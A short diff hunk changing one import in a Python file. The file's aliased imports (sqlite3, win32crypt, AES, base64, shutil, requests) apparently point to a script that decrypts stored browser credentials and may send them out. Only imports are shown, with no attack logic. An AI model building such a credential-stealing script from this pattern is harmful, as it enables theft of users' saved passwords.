@@ -5,7 +5,7 @@ import json as j
 import base64 as b
 import sqlite3 as q
 import win32crypt as w
-from Cryptodome.Cipher import AES as a
+from Crypto.Cipher import AES
 import shutil as h
 import csv as c
 import requests as req
